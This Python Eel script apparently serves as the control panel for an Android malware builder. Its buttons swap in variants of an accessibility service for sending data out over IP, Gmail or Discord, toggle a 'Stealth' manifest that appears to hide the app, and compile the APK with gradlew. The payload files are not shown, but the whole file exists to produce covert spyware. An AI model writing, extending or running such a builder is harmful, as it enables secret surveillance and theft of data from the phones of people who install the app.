import eel
import subprocess
import shutil
import os

eel.init('web')

@eel.expose
def run_build():
    try:
        process = subprocess.Popen(["gradlew.bat", "assembleDebug"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, cwd=".")
        output = ""
        for line in iter(process.stdout.readline, b''):
            output += line.decode()
        process.stdout.close()
        process.wait()
        return output
    except FileNotFoundError:
        return "gradlew.bat not found in current directory."

@eel.expose
def set_ip():
    try:
        # Copy MyAccessibilityService.java
        source_path1 = 'Versions/IP/MyAccessibilityService.java'
        destination_path1 = 'app/src/main/java/com/'
        shutil.copy(source_path1, destination_path1)

        # Copy strings.xml
        source_path2 = 'Versions/IP/strings.xml'
        destination_path2 = 'app/src/main/res/values/'
        shutil.copy(source_path2, destination_path2)

        return "Files set successfully."
    except Exception as e:
        return f"Error setting files: {e}"

@eel.expose
def set_gmail():
    try:
        # Copy MyAccessibilityService.java for Gmail
        source_path1 = 'Versions/Gmail/MyAccessibilityService.java'
        destination_path1 = 'app/src/main/java/com/'
        shutil.copy(source_path1, destination_path1)

        # Copy strings.xml for Gmail
        source_path2 = 'Versions/Gmail/strings.xml'
        destination_path2 = 'app/src/main/res/values/'
        shutil.copy(source_path2, destination_path2)

        return "Gmail files set successfully."
    except Exception as e:
        return f"Error setting Gmail files: {e}"

@eel.expose
def set_discord():
    try:
        # Copy MyAccessibilityService.java for Discord
        source_path1 = 'Versions/Discord/MyAccessibilityService.java'
        destination_path1 = 'app/src/main/java/com/'
        shutil.copy(source_path1, destination_path1)

        # Copy strings.xml for Discord
        source_path2 = 'Versions/Discord/strings.xml'
        destination_path2 = 'app/src/main/res/values/'
        shutil.copy(source_path2, destination_path2)

        return "Discord files set successfully."
    except Exception as e:
        return f"Error setting Discord files: {e}"
    
@eel.expose
def set_setStealthOFF():
    try:
        # Copy AndroidManifest.xml normal to source
        source_path1 = 'Versions/NonStealth/AndroidManifest.xml'
        destination_path1 = 'app/src/main/'
        shutil.copy(source_path1, destination_path1)

        return "Stealth OFF"
    except Exception as e:
        return f"Error setting manifest file: {e}"
    
@eel.expose
def set_setStealthON():
    try:
        # Copy AndroidManifest.xml stealth to source
        source_path1 = 'Versions/Stealth/AndroidManifest.xml'
        destination_path1 = 'app/src/main/'
        shutil.copy(source_path1, destination_path1)

        return "Stealth ON"
    except Exception as e:
        return f"Error setting manifest file: {e}"
    
# Function to open IP config GUI
@eel.expose
def open_ip_config():
    try:
        os.system('IPhtmlUpdater.exe')
        return "IP config GUI opened successfully."
    except Exception as e:
        return f"Error opening IP config GUI: {e}"

# Function to open Gmail config GUI
@eel.expose
def open_gmail_config():
    try:
        os.system('Gmail.exe')
        return "Gmail config GUI opened successfully."
    except Exception as e:
        return f"Error opening Gmail config GUI: {e}"

# Function to open Discord config GUI
@eel.expose
def open_discord_config():
    try:
        os.system('Discord_HTML.exe')
        return "Discord config GUI opened successfully."
    except Exception as e:
        return f"Error opening Discord config GUI: {e}"

eel.start('index.html', size=(530, 750), port=9999)
